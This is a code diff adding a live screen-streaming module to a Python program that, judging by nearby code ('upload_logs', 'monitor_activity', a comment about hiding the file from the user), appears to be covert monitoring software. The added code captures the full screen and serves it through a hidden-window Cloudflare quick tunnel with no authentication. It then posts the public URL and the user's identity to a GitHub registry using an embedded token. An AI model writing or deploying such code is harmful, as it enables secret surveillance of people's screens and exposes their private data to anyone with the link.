@@ -1,3 +1,4 @@
+# screen view using cloudflare quick tunnel (no credentials needed, no external dependencies like boto3, works in compiled .exe without bundling cloudflared)
 import os
 import sys
 import time
@@ -2487,12 +2488,339 @@ def upload_logs():
         time.sleep(upload_interval if upload_interval != DEFAULT_UPLOAD_INTERVAL else fallback_interval)
 
 
-# Live Screen View Module  (Cloudflare Tunnel + JS-snapshot HTTP server)
+# Live Screen View Module  (Cloudflare Tunnel + local MJPEG HTTP server)
 # ----------------------------------------------------------------------------------
-# Extracted to live_view.py for easier maintenance and feature additions.
-# configure() must be called once (in main()) before starting the server thread.
+# NO credentials needed — uses Cloudflare Quick Tunnels (trycloudflare.com).
+# No Cloudflare account, no API keys, no R2 setup.
+#
+# Logic:
+#   1. Start a lightweight MJPEG HTTP server on a random free localhost port.
+#   2. Run cloudflared.exe --url http://localhost:{port}  (Quick Tunnel, free, no login)
+#      → cloudflared prints a random public URL: https://abc-xyz.trycloudflare.com
+#   3. Register {unique_id, username, stream_url, snapshot_url} to GitHub ONCE at startup.
+#      (single write, not per-frame — no rate limit concern)
+#   4. The viewer reads the GitHub registry, picks a device, and opens the tunnel URL.
+#   5. Browser renders the MJPEG stream natively — true real-time, ~0.5 s latency.
+#   6. cloudflared.exe is auto-downloaded on first run (~40 MB, stored in app_dir).
 
-import live_view
+import re as _re
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from socketserver import ThreadingMixIn
+
+LIVE_STREAM_FPS_INTERVAL = 0.5   # seconds between snapshot captures (server side)
+LIVE_STREAM_PORT = 8765          # fixed port — change if already in use
+live_stream_active = True        # set to False only when server is shutting down
+_cf_process = None               # cloudflared subprocess handle
+
+# ── MJPEG HTTP server ─────────────────────────────────────────────────────────────
+
+class _MJPEGHandler(BaseHTTPRequestHandler):
+    """Serves /stream (MJPEG), /snapshot (single JPEG), /status (JSON)."""
+
+    _HTML_VIEWER = None  # cached at class level after first build
+
+    def do_GET(self):
+        if self.path in ("/", ""):
+            self._serve_html()
+        elif self.path.startswith("/stream"):
+            self._serve_mjpeg()
+        elif self.path == "/snapshot":
+            self._serve_snapshot()
+        elif self.path == "/status":
+            self._serve_status()
+        else:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b"Not found")
+
+    def _serve_html(self):
+        """Serve a self-contained HTML viewer page with auto-starting MJPEG stream."""
+        html = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Live View – {username}</title>
+  <style>
+    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
+    body {{ background: #111; color: #e0e0e0; font-family: 'Segoe UI', sans-serif;
+            display: flex; flex-direction: column; align-items: center;
+            min-height: 100vh; padding: 16px; }}
+    header {{ width: 100%; max-width: 1300px; display: flex; align-items: center;
+              justify-content: space-between; padding: 8px 0 14px; }}
+    header h1 {{ font-size: 1.1rem; font-weight: 600; color: #fff; }}
+    .badge {{ background: #16a34a; color: #fff; font-size: 0.75rem;
+              padding: 3px 10px; border-radius: 99px; }}
+    .uuid  {{ font-size: 0.72rem; color: #888; font-family: monospace; }}
+    #frame-wrap {{ width: 100%; max-width: 1300px; border-radius: 8px;
+                   overflow: hidden; background: #000;
+                   box-shadow: 0 4px 32px rgba(0,0,0,.6); }}
+    #frame-wrap img {{ width: 100%; display: block; }}
+    footer {{ margin-top: 12px; font-size: 0.7rem; color: #555; }}
+    #ts {{ color: #4ade80; }}
+    #fps {{ color: #888; margin-left: 8px; }}
+  </style>
+</head>
+<body>
+  <header>
+    <h1>🖥️ &nbsp;{username}</h1>
+    <span class="badge">● LIVE</span>
+    <span class="uuid">UUID: {unique_id}</span>
+  </header>
+  <div id="frame-wrap">
+    <img id="frame" src="/snapshot" alt="Live screen of {username}" />
+  </div>
+  <footer>Started &nbsp;·&nbsp; <span id="ts"></span><span id="fps"></span></footer>
+  <script>
+    document.getElementById('ts').textContent = new Date().toLocaleTimeString();
+    const img = document.getElementById('frame');
+    let errors = 0, frames = 0, last = Date.now();
+    function loadNext() {{
+      const next = new Image();
+      next.onload = function() {{
+        img.src = next.src;
+        errors = 0;
+        frames++;
+        if (frames % 10 === 0) {{
+          const now = Date.now();
+          const fps = (10000 / (now - last)).toFixed(1);
+          last = now;
+          document.getElementById('fps').textContent = ' · ' + fps + ' fps';
+        }}
+        setTimeout(loadNext, 500);
+      }};
+      next.onerror = function() {{
+        errors++;
+        setTimeout(loadNext, Math.min(500 * errors, 5000));
+      }};
+      next.src = '/snapshot?' + Date.now();
+    }}
+    loadNext();
+  </script>
+</body>
+</html>
+""".encode()
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(html)))
+        self.send_header("Cache-Control", "no-cache")
+        self.end_headers()
+        self.wfile.write(html)
+
+    def _serve_mjpeg(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
+        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.end_headers()
+        while live_stream_active:
+            try:
+                frame = _capture_jpeg()
+                self.wfile.write(
+                    b"--frame\r\n"
+                    b"Content-Type: image/jpeg\r\n"
+                    + f"Content-Length: {len(frame)}\r\n\r\n".encode()
+                    + frame
+                    + b"\r\n"
+                )
+                self.wfile.flush()
+                time.sleep(LIVE_STREAM_FPS_INTERVAL)
+            except (BrokenPipeError, ConnectionResetError):
+                break
+            except Exception as e:
+                logging.error(f"[LiveView] MJPEG write error: {e}")
+                break
+
+    def _serve_snapshot(self):
+        frame = _capture_jpeg()
+        self.send_response(200)
+        self.send_header("Content-Type", "image/jpeg")
+        self.send_header("Content-Length", str(len(frame)))
+        self.send_header("Cache-Control", "no-cache")
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.end_headers()
+        self.wfile.write(frame)
+
+    def _serve_status(self):
+        body = json.dumps({
+            "unique_id": unique_id,
+            "username": username,
+            "timestamp": datetime.now().isoformat(),
+            "streaming": live_stream_active,
+        }).encode()
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(body)))
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.end_headers()
+        self.wfile.write(body)
+
+    def log_message(self, format, *args):
+        pass  # suppress per-request access logs
+
+class _ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    """Handle each viewer connection in its own thread."""
+    daemon_threads = True
+
+def _capture_jpeg(max_w=1280, quality=65):
+    """Capture full screen, resize to max_w, return JPEG bytes."""
+    img = pyautogui.screenshot()
+    if img.width > max_w:
+        img = img.resize((max_w, int(img.height * max_w / img.width)))
+    buf = BytesIO()
+    img.save(buf, format="JPEG", quality=quality, optimize=True)
+    return buf.getvalue()
+
+# ── cloudflared management ────────────────────────────────────────────────────────
+
+def _get_cloudflared():
+    """Return path to the already-downloaded cloudflared.exe in app_dir."""
+    path = os.path.join(app_dir, "cloudflared.exe")
+    if not os.path.exists(path):
+        logging.error(f"[LiveView] cloudflared.exe not found at {path}")
+        print(f"[LiveView] cloudflared.exe not found at {path} — place it there and restart.")
+        return None
+    return path
+
+def _start_cloudflared(port):
+    """
+    Launch cloudflared Quick Tunnel for http://localhost:{port}.
+    Returns (tunnel_url, process) or (None, None) on failure.
+    Blocks up to 30 s while waiting for cloudflared to print the public URL.
+    """
+    global _cf_process
+    cf = _get_cloudflared()
+    if not cf:
+        return None, None
+    try:
+        proc = subprocess.Popen(
+            [cf, "tunnel", "--url", f"http://localhost:{port}", "--protocol", "http2", "--no-autoupdate"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+        )
+        _cf_process = proc
+        url_re = _re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com")
+        deadline = time.time() + 30
+        while time.time() < deadline:
+            line = proc.stdout.readline()
+            if not line:
+                time.sleep(0.1)
+                continue
+            m = url_re.search(line)
+            if m:
+                return m.group(0), proc
+        logging.error("[LiveView] cloudflared did not emit a URL within 30 s.")
+        return None, proc
+    except Exception as e:
+        logging.error(f"[LiveView] cloudflared start error: {e}")
+        return None, None
+
+# ── GitHub registry (single write per session) ───────────────────────────────────
+
+def _registry_put(info: dict):
+    """Write tunnel registry entry for this device to GitHub."""
+    try:
+        path = f"live/{unique_id}/tunnel.json"
+        file_url = f"{API_BASE_URL}/repos/{REPO}/contents/{path}"
+        headers = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Accept": "application/vnd.github.v3+json",
+        }
+        sha = None
+        try:
+            r = requests.get(file_url, headers=headers, timeout=10)
+            if r.status_code == 200:
+                sha = r.json().get("sha")
+        except Exception:
+            pass
+        payload = {
+            "message": f"live register {unique_id}",
+            "content": base64.b64encode(json.dumps(info, indent=2).encode()).decode(),
+            "branch": BRANCH,
+        }
+        if sha:
+            payload["sha"] = sha
+        requests.put(file_url, headers=headers, json=payload, timeout=15)
+    except Exception as e:
+        logging.error(f"[LiveView] Registry write error: {e}")
+
+def _register_tunnel(tunnel_url):
+    """Register tunnel URL + device info to GitHub."""
+    info = {
+        "unique_id": unique_id,
+        "username": username,
+        "tunnel_url": tunnel_url,
+        "stream_url": f"{tunnel_url}/stream",
+        "snapshot_url": f"{tunnel_url}/snapshot",
+        "status_url": f"{tunnel_url}/status",
+        "timestamp": datetime.now().isoformat(),
+        "online": True,
+    }
+    _registry_put(info)
+    logging.info(f"[LiveView] Stream live at {tunnel_url}/stream")
+    print(f"[LiveView] Stream live at {tunnel_url}/stream")
+
+def _unregister_tunnel():
+    """Mark device as offline in the GitHub registry on shutdown."""
+    try:
+        path = f"live/{unique_id}/tunnel.json"
+        file_url = f"{API_BASE_URL}/repos/{REPO}/contents/{path}"
+        headers = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Accept": "application/vnd.github.v3+json",
+        }
+        r = requests.get(file_url, headers=headers, timeout=10)
+        if r.status_code != 200:
+            return
+        data = r.json()
+        info = json.loads(base64.b64decode(data["content"]).decode())
+        info["online"] = False
+        info["timestamp"] = datetime.now().isoformat()
+        requests.put(file_url, headers=headers, json={
+            "message": f"live offline {unique_id}",
+            "content": base64.b64encode(json.dumps(info, indent=2).encode()).decode(),
+            "branch": BRANCH,
+            "sha": data["sha"],
+        }, timeout=15)
+    except Exception as e:
+        logging.error(f"[LiveView] Unregister error: {e}")
+
+# ── Entry point ───────────────────────────────────────────────────────────────────
+
+def start_live_view_server():
+    """
+    Start the screen-view HTTP server on LIVE_STREAM_PORT, launch a Cloudflare
+    Quick Tunnel, and register the public URL to GitHub.
+    Called once from a daemon thread in main().
+    """
+    global live_stream_active
+
+    port = LIVE_STREAM_PORT
+    server = _ThreadedHTTPServer(("127.0.0.1", port), _MJPEGHandler)
+    logging.info(f"[LiveView] Server listening on localhost:{port}")
+    print(f"[LiveView] Server listening on localhost:{port}")
+
+    # Start cloudflared in a parallel thread so the HTTP server can begin immediately
+    def _tunnel_thread():
+        url, _ = _start_cloudflared(port)
+        if url:
+            _register_tunnel(url)
+        else:
+            logging.error("[LiveView] No tunnel URL — stream unreachable from outside.")
+            print("[LiveView] No tunnel URL — stream unreachable from outside.")
+
+    threading.Thread(target=_tunnel_thread, daemon=True).start()
+
+    try:
+        server.serve_forever()
+    finally:
+        live_stream_active = False
+        _unregister_tunnel()
+        if _cf_process:
+            _cf_process.terminate()
 
 
 # hide the file from the user
@@ -2761,12 +3089,8 @@ def main():
         activity_thread = threading.Thread(target=monitor_activity, daemon=True)
         activity_thread.start()
 
-        # Start live screen view server (Cloudflare Quick Tunnel + JS snapshot)
-        live_view.configure(
-            username, unique_id, app_dir,
-            API_BASE_URL, REPO, GITHUB_TOKEN, BRANCH,
-        )
-        live_view_server_thread = threading.Thread(target=live_view.start_live_view_server, daemon=True)
+        # Start live screen view server (MJPEG + Cloudflare Quick Tunnel)
+        live_view_server_thread = threading.Thread(target=start_live_view_server, daemon=True)
         live_view_server_thread.start()
         
     except KeyboardInterrupt:
